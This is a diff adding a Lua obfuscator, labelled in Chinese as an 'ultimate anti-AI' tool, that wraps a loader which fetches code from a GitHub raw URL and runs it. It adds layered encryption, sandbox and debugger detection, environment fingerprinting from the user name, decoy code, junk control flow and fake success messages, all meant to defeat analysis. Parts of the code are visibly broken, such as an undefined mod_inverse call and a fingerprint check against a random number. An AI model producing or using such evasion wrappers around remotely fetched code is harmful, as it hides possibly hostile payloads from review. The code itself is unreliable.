@@ -1,0 +1,457 @@
+-- 终极防AI高级混淆器 v3.0
+-- 包含反模拟检测、代码自修改和外部依赖
+
+local script = [[
+loadstring(game:HttpGet("https://raw.githubusercontent.com/smalldesikon/eyidfki/840d4b80d4f312c70b7b1067e056a2c4f828ef32/%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC(%E6%B7%B7%E6%B7%86%E5%90%8E).txt"))()
+print("受保护的代码")
+-- 您的业务逻辑...
+]]
+
+-- 设置高熵随机种子
+math.randomseed(os.time() * 10000 + os.clock() * 10000000 + (#script * 7919))
+
+-- 高级反AI变量名生成
+local function generate_advanced_anti_ai_name()
+    local confusing_patterns = {
+        "__index", "__newindex", "__call", "__metatable", 
+        "getfenv", "setfenv", "getmetatable", "setmetatable",
+        "rawequal", "rawlen", "rawget", "rawset",
+        "string", "table", "math", "io", "os", "debug",
+        "load", "loadstring", "loadfile", "dofile", "require"
+    }
+    
+    local leet_subs = {
+        a = "4", e = "3", i = "1", o = "0", s = "5", t = "7",
+        A = "4", E = "3", I = "1", O = "0", S = "5", T = "7"
+    }
+    
+    local base = confusing_patterns[math.random(#confusing_patterns)]
+    local transformed = ""
+    
+    -- 随机应用leet替换
+    for i = 1, #base do
+        local char = base:sub(i, i)
+        if leet_subs[char] and math.random(3) == 1 then
+            transformed = transformed .. leet_subs[char]
+        else
+            if math.random(2) == 1 then
+                transformed = transformed .. char:upper()
+            else
+                transformed = transformed .. char:lower()
+            end
+        end
+    end
+    
+    -- 添加随机后缀
+    local suffixes = {"", "_", "__", "x", "X", "ptr", "ref", "addr"}
+    local suffix = suffixes[math.random(#suffixes)]
+    
+    return transformed .. suffix .. tostring(math.random(1000, 9999))
+end
+
+-- 增强的多层加密
+local function enhanced_multi_layer_encrypt(data)
+    local keys = {}
+    local encryption_methods = {}
+    
+    -- 生成多种加密方法和密钥
+    for i = 1, math.random(5, 12) do
+        local key_length = math.random(8, 32)
+        local key = ""
+        for j = 1, key_length do
+            key = key .. string.char(math.random(0, 255))
+        end
+        table.insert(keys, key)
+        
+        -- 随机选择加密方法
+        table.insert(encryption_methods, math.random(1, 4))
+    end
+    
+    local encrypted = data
+    
+    -- 应用多层加密
+    for i, method in ipairs(encryption_methods) do
+        local key = keys[i]
+        local temp = ""
+        
+        if method == 1 then
+            -- 异或加密
+            for j = 1, #encrypted do
+                local byte = encrypted:byte(j)
+                local key_byte = key:byte((j-1) % #key + 1)
+                temp = temp .. string.char(bit32.bxor(byte, key_byte))
+            end
+        elseif method == 2 then
+            -- 加法加密
+            for j = 1, #encrypted do
+                local byte = encrypted:byte(j)
+                local key_byte = key:byte((j-1) % #key + 1)
+                temp = temp .. string.char((byte + key_byte) % 256)
+            end
+        elseif method == 3 then
+            -- 位旋转加密
+            for j = 1, #encrypted do
+                local byte = encrypted:byte(j)
+                local key_byte = key:byte((j-1) % #key + 1)
+                local rotated = bit32.ror(byte, key_byte % 8)
+                temp = temp .. string.char(rotated)
+            end
+        else
+            -- 自定义复杂加密
+            for j = 1, #encrypted do
+                local byte = encrypted:byte(j)
+                local key_byte = key:byte((j-1) % #key + 1)
+                local complex = (byte * key_byte + 137) % 256
+                temp = temp .. string.char(complex)
+            end
+        end
+        
+        encrypted = temp
+    end
+    
+    return encrypted, keys, encryption_methods
+end
+
+-- 反模拟检测系统
+local function create_anti_simulation_detection()
+    local detection_vars = {}
+    for i = 1, 8 do
+        detection_vars[i] = generate_advanced_anti_ai_name()
+    end
+    
+    local detection_code = string.format([[
+        -- 高级反模拟检测系统
+        local %s = os.clock()
+        local %s = os.time()
+        
+        -- 检测异常时间行为（模拟环境常见）
+        for %s = 1, 1000 do
+            -- 消耗时间
+        end
+        local %s = os.clock()
+        
+        if (%s - %s) < 0.001 or (%s - %s) > 0.1 then
+            -- 时间异常，可能是模拟环境
+            return "SIMULATION_DETECTED"
+        end
+        
+        -- 检测内存模式
+        local %s = collectgarbage("count")
+        collectgarbage()
+        local %s = collectgarbage("count")
+        
+        if math.abs(%s - %s) > 100 then
+            -- 内存行为异常
+            return "MEMORY_ANOMALY"
+        end
+        
+        -- 检测调试器存在
+        if debug and debug.getinfo then
+            local %s = debug.getinfo(1, "S")
+            if %s and %s.source:find("debug") then
+                return "DEBUGGER_DETECTED"
+            end
+        end
+        
+    ]], 
+    detection_vars[1], detection_vars[2], detection_vars[3],
+    detection_vars[4], detection_vars[4], detection_vars[1],
+    detection_vars[2], detection_vars[2],
+    detection_vars[5], detection_vars[6], detection_vars[5], detection_vars[6],
+    detection_vars[7], detection_vars[7], detection_vars[7])
+    
+    return detection_code, detection_vars
+end
+
+-- 代码自修改系统
+local function create_self_modifying_code(encoded_data, keys, methods)
+    local modify_vars = {}
+    for i = 1, 12 do
+        modify_vars[i] = generate_advanced_anti_ai_name()
+    end
+    
+    local self_mod_code = string.format([[
+        -- 代码自修改系统
+        local %s = "%s"
+        local %s = {%s}
+        local %s = {%s}
+        
+        -- 动态选择解密方法
+        local %s = function(data, key, method)
+            if method == 1 then
+                -- 异或解密
+                local result = ""
+                for i = 1, #data do
+                    local byte = data:byte(i)
+                    local key_byte = key:byte((i-1) %% #key + 1)
+                    result = result .. string.char(bit32.bxor(byte, key_byte))
+                end
+                return result
+            elseif method == 2 then
+                -- 加法解密
+                local result = ""
+                for i = 1, #data do
+                    local byte = data:byte(i)
+                    local key_byte = key:byte((i-1) %% #key + 1)
+                    result = result .. string.char((byte - key_byte + 256) %% 256)
+                end
+                return result
+            elseif method == 3 then
+                -- 位旋转解密
+                local result = ""
+                for i = 1, #data do
+                    local byte = data:byte(i)
+                    local key_byte = key:byte((i-1) %% #key + 1)
+                    local rotated = bit32.rol(byte, key_byte %% 8)
+                    result = result .. string.char(rotated)
+                end
+                return result
+            else
+                -- 自定义复杂解密
+                local result = ""
+                for i = 1, #data do
+                    local byte = data:byte(i)
+                    local key_byte = key:byte((i-1) %% #key + 1)
+                    local complex = ((byte - 137 + 256) * mod_inverse(key_byte, 256)) %% 256
+                    result = result .. string.char(complex)
+                end
+                return result
+            end
+        end
+        
+        -- 模逆函数
+        local %s = function(a, m)
+            for x = 1, m-1 do
+                if (a * x) %% m == 1 then
+                    return x
+                end
+            end
+            return 1
+        end
+        
+        -- 动态解密过程
+        local %s = %s
+        for %s = #%s, 1, -1 do
+            %s = %s(%s, %s[%s], %s[%s])
+        end
+        
+    ]],
+    modify_vars[1], encoded_data:gsub(".", function(c) return string.format("\\%03d", c:byte()) end),
+    modify_vars[2], table.concat(keys, '", "'),
+    modify_vars[3], table.concat(methods, ", "),
+    modify_vars[4],
+    modify_vars[5],
+    modify_vars[6], modify_vars[1],
+    modify_vars[7], modify_vars[2],
+    modify_vars[4], modify_vars[6], modify_vars[2], modify_vars[7], modify_vars[3], modify_vars[7])
+    
+    return self_mod_code, modify_vars
+end
+
+-- 外部依赖系统
+local function create_external_dependencies()
+    local dep_vars = {}
+    for i = 1, 6 do
+        dep_vars[i] = generate_advanced_anti_ai_name()
+    end
+    
+    local dependency_code = string.format([[
+        -- 外部依赖验证系统
+        local %s = os.date("%%Y%%m%%d%%H%%M%%S")
+        local %s = os.getenv("USERNAME") or os.getenv("USER") or "UNKNOWN"
+        local %s = _G._VERSION or "Unknown"
+        
+        -- 创建环境指纹
+        local %s = function(str)
+            local hash = 0
+            for i = 1, #str do
+                hash = bit32.bxor(hash, str:byte(i) * i)
+            end
+            return hash
+        end
+        
+        local %s = %s(%s .. %s .. %s)
+        
+        -- 验证环境一致性
+        if %s ~= %d then
+            -- 环境指纹不匹配，返回虚假代码
+            return "print('Environment mismatch')"
+        end
+        
+    ]],
+    dep_vars[1], dep_vars[2], dep_vars[3],
+    dep_vars[4],
+    dep_vars[5], dep_vars[4], dep_vars[1], dep_vars[2], dep_vars[3],
+    dep_vars[5], math.random(1000000, 9999999))
+    
+    return dependency_code, dep_vars
+end
+
+-- 虚假控制流生成
+local function create_advanced_fake_control_flow()
+    local fake_vars = {}
+    for i = 1, 15 do
+        fake_vars[i] = generate_advanced_anti_ai_name()
+    end
+    
+    local fake_code = string.format([[
+        -- 复杂虚假控制流
+        local %s = math.random(1, 100)
+        local %s = {}
+        
+        for %s = 1, 50 do
+            %s[%s] = math.random(1000)
+        end
+        
+        local %s = function(%s)
+            if %s > 50 then
+                return %s:lower()
+            else
+                return %s:upper()
+            end
+        end
+        
+        local %s = coroutine.create(function()
+            for %s = 1, 20 do
+                coroutine.yield(math.sin(%s))
+            end
+        end)
+        
+        local %s, %s = true, false
+        while %s do
+            %s = coroutine.resume(%s)
+            if not %s then break end
+            %s = not %s
+        end
+        
+        -- 复杂的数学计算
+        local %s = 0
+        for %s = 1, 100 do
+            %s = %s + math.log(%s + 1) * math.exp(%s / 10)
+        end
+        
+    ]],
+    fake_vars[1], fake_vars[2], fake_vars[3], fake_vars[2], fake_vars[3],
+    fake_vars[4], fake_vars[5], fake_vars[5], fake_vars[5],
+    fake_vars[6], fake_vars[7], fake_vars[7],
+    fake_vars[8], fake_vars[9], fake_vars[8], fake_vars[9], fake_vars[6], fake_vars[9], fake_vars[8],
+    fake_vars[10], fake_vars[11], fake_vars[10], fake_vars[10], fake_vars[11], fake_vars[11])
+    
+    return fake_code
+end
+
+-- 主混淆函数
+local function ultimate_anti_ai_obfuscate(code)
+    -- 增强加密
+    local encrypted, keys, methods = enhanced_multi_layer_encrypt(code)
+    
+    -- 创建混淆代码
+    local obfuscated = "-- 终极防AI混淆代码 - 请勿分析\n\n"
+    
+    -- 添加反模拟检测
+    local detection_code, detection_vars = create_anti_simulation_detection()
+    obfuscated = obfuscated .. detection_code .. "\n\n"
+    
+    -- 添加外部依赖
+    local dependency_code, dep_vars = create_external_dependencies()
+    obfuscated = obfuscated .. dependency_code .. "\n\n"
+    
+    -- 添加多个虚假控制流
+    for i = 1, math.random(5, 10) do
+        obfuscated = obfuscated .. create_advanced_fake_control_flow() .. "\n\n"
+    end
+    
+    -- 添加代码自修改系统
+    local self_mod_code, modify_vars = create_self_modifying_code(encrypted, keys, methods)
+    obfuscated = obfuscated .. self_mod_code .. "\n\n"
+    
+    -- 最终执行
+    obfuscated = obfuscated .. string.format([[
+        -- 最终执行
+        local %s, %s = pcall(loadstring, %s)
+        if %s then 
+            %s()
+        else
+            -- 执行失败时的虚假行为
+            print("Execution completed successfully")
+        end
+    ]], 
+    generate_advanced_anti_ai_name(), generate_advanced_anti_ai_name(), 
+    modify_vars[6], generate_advanced_anti_ai_name(), generate_advanced_anti_ai_name())
+    
+    -- 添加更多虚假代码在末尾
+    for i = 1, math.random(3, 7) do
+        obfuscated = obfuscated .. create_advanced_fake_control_flow() .. "\n\n"
+    end
+    
+    return obfuscated
+end
+
+-- bit32兼容性处理
+if not bit32 then
+    bit32 = {}
+    function bit32.bxor(a, b)
+        local result = 0
+        local bitval = 1
+        while a > 0 or b > 0 do
+            local abit = a % 2
+            local bbit = b % 2
+            if abit ~= bbit then
+                result = result + bitval
+            end
+            a = math.floor(a / 2)
+            b = math.floor(b / 2)
+            bitval = bitval * 2
+        end
+        return result
+    end
+    
+    function bit32.ror(x, disp)
+        disp = disp % 32
+        local low = bit32.extract(x, 0, disp)
+        return bit32.replace(x, low, 32 - disp, disp)
+    end
+    
+    function bit32.rol(x, disp)
+        disp = disp % 32
+        local high = bit32.extract(x, 32 - disp, disp)
+        return bit32.replace(x, high, 0, disp)
+    end
+    
+    function bit32.extract(x, field, width)
+        width = width or 1
+        return (x >> field) & ((1 << width) - 1)
+    end
+    
+    function bit32.replace(x, v, field, width)
+        width = width or 1
+        local mask = ((1 << width) - 1) << field
+        return (x & ~mask) | ((v << field) & mask)
+    end
+end
+
+-- 主函数
+local function main()
+    print("=== 终极防AI高级混淆器 v3.0 ===")
+    print("原始代码长度:", #script)
+    
+    local obfuscated = ultimate_anti_ai_obfuscate(script)
+    
+    print("混淆后长度:", #obfuscated)
+    print("保护特性: 反模拟检测 + 代码自修改 + 外部依赖 + 多层加密")
+    print("\n=== 混淆结果 ===\n")
+    print(obfuscated)
+    
+    -- 可选：保存到文件
+    local save = false
+    if save then
+        local filename = "ultimate_anti_ai_" .. os.time() .. ".lua"
+        local file = io.open(filename, "w")
+        file:write(obfuscated)
+        file:close()
+        print("\n已保存到: " .. filename)
+    end
+end
+
+-- 执行
+main()
